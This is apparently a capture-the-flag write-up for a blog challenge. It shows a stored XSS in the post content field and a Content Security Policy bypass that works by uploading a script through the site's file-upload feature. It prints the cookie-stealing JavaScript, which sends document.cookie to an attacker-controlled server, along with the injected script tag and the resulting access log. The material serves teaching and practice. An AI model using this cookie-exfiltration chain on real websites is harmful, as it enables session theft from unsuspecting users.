# My First Blog

## Description
```
Why is this file upload feature needed if it is safe??
```

## Writeup

Taking a look at the website we see some things going on there. <br/>
![image](https://github.com/Aryt3/writeups/assets/110562298/dfc95f3f-1084-4f84-a6f0-0c24120c0c09)

Now my first assumption was that this has to be an `XSS` vulnerability because we are able to create blog posts and report them meaning someone (a bot) would probably visit the webpage. <br/>
Testing out the different input fields I found that `Content` was vulnerable to `XSS` because I could inject custom `html`. <br/>
The problem I had was that the `Content Security Policy` was denying any outside source being accessed. <br/>
Knowing this I had to somehow bypass the `CSP` and looking at the homepage we can see that there is also a file uplaod feature. <br/>

Having this information I crafted my javascript exploit which gets the `document.cookie` and sends it to the webserver I own. <br/>
```js
var xhr = new XMLHttpRequest();
var url = `https://MYWEBSERVER/${document.cookie}`;

xhr.open('GET', url, true);
xhr.send();
```

Having the exploit I created a new blog post with the content being the one below. <br/>
```html
<script src="/files/my_exploit.js"></script>
```

I then proceeded to report this blog post. <br/>
Looking at the access logs of my webserver I got a new request. <br/>
```
aryt3@mywebserver tail -f /var/log/nginx-access.log

-------------------------------------
45.88.77.177 - - [11/Jan/2024:20:01:47 +0100] "GET /Cookie-grodno%?BxsS_8L09_12312dD%7D HTTP/1.1" 404 188 "http://127.0.0.1:21000/" "Mozilla/5.0 (X11; Linux x86 _64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/119.0.0.0 Safari/537.36"
```

Having gotten a request with the encoded cookie `/Cookie-grodno%?BxsS_8L09_12312dD%7D` I URL-decoded it. <br/>
Getting the flag `grodno{xsS_8L09_12312dD}` concludes this writeup.
